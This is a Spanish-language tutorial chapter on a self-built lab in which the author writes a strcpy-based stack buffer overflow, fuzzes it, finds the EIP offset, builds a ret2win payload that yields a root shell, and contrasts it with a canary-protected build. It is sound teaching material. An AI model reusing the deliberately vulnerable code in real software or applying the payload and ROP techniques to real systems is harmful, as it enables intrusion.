# 4. Caso práctico: del fallo al exploit

Aquí recorro un caso completo, de principio a fin y reproducible, aplicando las 7
fases a un stack buffer overflow. Es el camino que plantea el manual, pero
documentado para que otro pueda repetirlo. El código y los comandos están en
[`../labs/`](../labs/).

Elegí este fallo a propósito: no es el más crítico ni el más reciente, pero es
sencillo de reproducir y tiene fondo técnico real. En 32 bits es casi trivial, en
64 bits se complica, y me deja meter después las protecciones modernas sin
cambiar de escenario. Para construir el conocimiento desde abajo en vez de
ejecutar pasos de memoria, va perfecto.

## 4.1. Entenderlo desde dentro

En lugar de montar una máquina vulnerable ya hecha y lanzarle un exploit público,
hago el camino al revés: escribo yo el programa vulnerable y su versión
corregida. Así contrasto el comportamiento de los dos y recorro con conciencia
cada paso intermedio —análisis del crash, offset, control del flujo,
redirección—.

La familia es el stack buffer overflow: desbordar un búfer de la pila hasta pisar
lo que tiene al lado, incluida la dirección de retorno, lo que bajo ciertas
condiciones te deja controlar el flujo de ejecución.

## 4.2. Fase 1 — Identificar el fallo en el fuente

El punto de entrada se ve a simple vista: el programa copia la entrada del
usuario en un búfer fijo sin mirar cuánto ocupa.

```c
// vulnerable.c  (fiel al manual)
void vulnerable_function(char *input) {
    char buffer[1000];
    strcpy(buffer, input);   // sin verificación de tamaño -> stack BOF
    printf("Has introducido: %s\n", buffer);
}
```

El olor a fallo es un `strcpy(dest, src)` donde `src` lo controla el usuario y
`dest` es un búfer de pila fijo. `strcpy` copia hasta el `\0`, sin mirar lo que
cabe en `dest`.

La versión corregida cambia una sola cosa —usar una función con control de
tamaño— y la vulnerabilidad desaparece:

```c
// corregido.c  (fiel al manual)
if (strcpy_s(buffer, sizeof(buffer), input) != 0) {   // función segura
    printf("Error copiando los datos de entrada.\n");
    return;
}
```

En Linux uso el equivalente, `snprintf` o `strncpy` con tamaño explícito. La idea
es la misma: nunca copies sin decir cuánto cabe en el destino.

Compilación del laboratorio (32 bits, sin protecciones, para aislar el fallo):

```bash
# Windows / MinGW (manual)
gcc -m32 -fno-stack-protector -z execstack -o vulnerable.exe vulnerable.c

# Linux (versión del laboratorio, buffer de 64 para ver EIP con entradas cortas)
gcc -m32 -fno-stack-protector -no-pie -z execstack -o vuln_linux vuln_linux.c
```

## 4.3. Fase 1 (bis) — Diffing entre los dos binarios

Con los dos ejecutables delante, el diffing enseña a nivel de ensamblador en qué
punto exacto entra la vulnerabilidad y cómo se corrige. Con Ghidra (estático) y
BinDiff o Diaphora (comparación), la diferencia se reduce a esto:

| Binario | Qué se ve en el desensamblado |
|---------|-------------------------------|
| `vulnerable` | Llamada directa a `strcpy`, sin comprobar longitud antes de copiar |
| `corregido` | Llamada a `strcpy_s`/`snprintf` con el tamaño del búfer, y una rama que aborta si no cabe |

Esto es lo que se hace en el mundo real cuando no tienes el fuente: el diffing
revela el fallo y su parche solo con los binarios. Practicarlo aquí, con el
código delante, entrena el ojo para cuando no lo tengas.

## 4.4. Fases 2 y 3 — Clasificación y contexto

- Tipo: stack-based buffer overflow → CWE-121, con raíz en CWE-787
  (out-of-bounds write) y CWE-120 (copia sin comprobar tamaño).
- Arquitectura: x86-32, así que el registro de instrucción es EIP (en x64 sería
  RIP).
- Protecciones: desactivadas a propósito —sin canary, sin PIE, NX off— para
  aislar la mecánica. En el capítulo 7 se ve qué pasa al reactivarlas.
- Superficie: entrada por línea de comandos (`argv[1]`). En un caso real sería un
  fichero, un paquete de red, un formulario, una API.
- Punto de entrada: confirmado que `vulnerable_function` recibe el argumento del
  usuario y lo pasa directo a `strcpy`.

## 4.5. Fase 4 — Fuzzing para localizar el umbral

Mando cadenas cada vez más largas hasta que el binario deja de comportarse normal
y revienta:

```bash
python3 fuzzer.py ./build/vuln_linux --start 50 --step 50 --max 1000
```

```
[+] len=50    -> OK (rc=0)
[+] len=60    -> OK (rc=0)
[!] len=80    -> CRASH (rc=-11)      <-- SIGSEGV: la entrada corrompe la pila
...
[+] Primer CRASH observado alrededor de 80 bytes.
```

El umbral confirma la hipótesis: a partir de cierta longitud, la entrada
sobrescribe algo que mata el programa. Ese algo es, casi seguro, la dirección de
retorno.

## 4.6. Fase 4 — Analizar el crash y controlar EIP

Ahora quiero saber si puedo controlar EIP. Uso un patrón cíclico —cada
subsecuencia de 4 bytes es única—, de modo que el valor que acabe en EIP me diga
el offset exacto:

```bash
PATRON=$(python3 find_offset.py gen 150)
gdb -q ./build/vuln_linux
(gdb) run $PATRON
...
Program received signal SIGSEGV
(gdb) info registers eip
eip   0x61616174          # valor real capturado del patrón en este laboratorio
```

Resuelvo el offset:

```bash
python3 find_offset.py find 0x61616174
# [+] Offset exacto: 76
```

Y confirmo el control total mandando `A*76 + BBBB`:

```bash
(gdb) run $(python3 -c 'print("A"*76 + "BBBB")')
(gdb) info registers eip
eip   0x42424242          # "BBBB" -> controlo EIP por completo
```

Una nota del entorno, porque el laboratorio corrió sobre Apple Silicon. Lo hice
en una Kali ARM64, compilando el binario x86-32 con el cross-compiler
`i686-linux-gnu-gcc -static` y ejecutándolo bajo QEMU (`qemu-user`). El análisis
sigue siendo x86/EIP al 100 %; lo único que cambia es que GDB se conecta al
gdbstub de QEMU (`qemu-i386 -g 1234 …` con `gdb-multiarch`). El offset 76 y el EIP
`0x61616174` de arriba son los valores reales de esa ejecución. En un host x86
nativo el procedimiento es idéntico con `gcc -m32` y `gdb` directo; el detalle
está en [`../labs/README.md`](../labs/README.md).

`eip = 0x42424242` es la prueba de concepto que lo sostiene todo: si decido qué va
en EIP, decido a dónde salta la CPU. A partir de aquí, el trabajo es elegir a
dónde saltar. Es la captura que hay que guardar (`capturas/04-control-eip.png`).

La estructura del payload queda fijada:

```
[ 'A' * 76 ][ dirección de retorno (4 bytes, little-endian) ][ ... ]
   relleno          nuevo EIP controlado por mí
```

## 4.7. Fase 5 — Explotación: redirigir el flujo (ret2win)

Con el offset y el control de EIP, construyo la carga. En laboratorio el payload
puede ser algo simple —abrir una calculadora, mostrar un mensaje— que sirva para
demostrar que el control es real. Aquí uso ret2win: salto a una función `win()`
que existe en el binario pero que el flujo normal nunca llama.

```bash
# 1) dirección real de win() (el binario la imprime al arrancar; o con nm)
nm -n build/vuln_linux | grep ' win'      # 08049895 T win  (en este laboratorio)

# 2) ajusta OFFSET y WIN_ADDR en exploit.py y lanza
python3 exploit.py ./build/vuln_linux
```

```
[+] win() alcanzada: control de flujo conseguido.
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Payload final:

```python
payload = b"A"*76 + struct.pack("<I", 0x08049895)   # relleno + &win (little-endian)
```

Un detalle que me costó un crash: la dirección de `win()` tiene bytes altos
(`0x95`, `0x98`). Si pasas el payload como string decodificado, Python lo
recodifica a UTF-8 al armar `argv` y corrompe esos bytes (`0x95` se convierte en
`0xC2 0x95`), con lo que EIP recibe basura y revienta en vez de saltar a `win()`.
La solución es pasar los bytes crudos por `argv`, que es lo que hace `exploit.py`.
Es de esas cosas de bajo nivel que solo se aprenden explotando de verdad.

**¿Y con protecciones?** Ret2win funciona porque no hay ASLR ni DEP estorbando y
conozco la dirección. En un caso real tendría que adaptar la carga: con DEP/NX
activo, nada de shellcode en pila —ret2libc o ROP—; con ASLR, un infoleak para
calcular direcciones en runtime; con canary, filtrarlo y reescribirlo intacto. La
técnica depende de la protección que haya puesta, que es de lo que iba el capítulo
2 y la esencia de la explotación moderna: ir resolviendo cada barrera.

**En 64 bits** el mismo fallo añade complejidad real. El registro a controlar es
RIP y las direcciones son de 8 bytes. La convención de llamada pasa los
argumentos por registros (`rdi`, `rsi`, `rdx`) en lugar de por la pila, así que
para llamar a `system("/bin/sh")` con ROP necesitas un gadget `pop rdi; ret` que
cargue el puntero a la cadena en `rdi`. Y las direcciones suelen llevar bytes
nulos en la parte alta, que rompen `strcpy` —se corta en el `\0`—, con lo que hay
que colocar el payload con cuidado.

## 4.8. Fase 6 — Validación y resumen

| Campo | Valor |
|-------|-------|
| Vulnerabilidad | Stack-based buffer overflow (CWE-121) |
| Causa raíz | Copia sin control de tamaño (`strcpy`) de entrada del usuario |
| Vector | Argumento de entrada → `vulnerable_function` → `strcpy` |
| Impacto | Control de EIP → ejecución de código arbitrario (en el lab, shell vía `win()`) |
| Condiciones | 32 bits, sin canary / PIE / NX; o, con protecciones, leak + ROP |
| Offset a EIP | 76 (valor real de este laboratorio; depende del compilador) |
| Dirección de `win()` | 0x08049895 (binario `-no-pie`, dirección fija) |
| Mitigación | Funciones con control de tamaño + canary + PIE/ASLR + DEP/NX + FORTIFY |

## 4.9. Contraste: el binario protegido

Compilando la misma vulnerabilidad con canary:

```bash
# (host x86)    make protegido
# (host ARM64)  make cross-protegido
qemu-i386 ./build/vuln_protegido $(python3 -c 'print("A"*200)')
# -> *** stack smashing detected ***: terminated
# -> qemu: uncaught target signal 6 (Aborted)
```

El canary detecta la sobrescritura y mata el proceso antes de usar la dirección
de retorno. El indicador es nítido: el crash pasa de señal 11 (SIGSEGV),
corrupción de la dirección de retorno, a señal 6 (SIGABRT), el abort del canary.
La misma entrada que antes daba shell de root ahora solo da un cierre controlado.
Esa diferencia —entre un fallo explotable y uno neutralizado por una decisión de
compilación— es el puente hacia el capítulo de bastionado.

Lo que deja claro este caso: entender una vulnerabilidad de verdad es recorrer
todas las fases, no solo lanzar el exploit. Fuzzing, offset, control de EIP,
redirección: cada paso es una pieza que luego sirve en fallos mucho más
complejos.
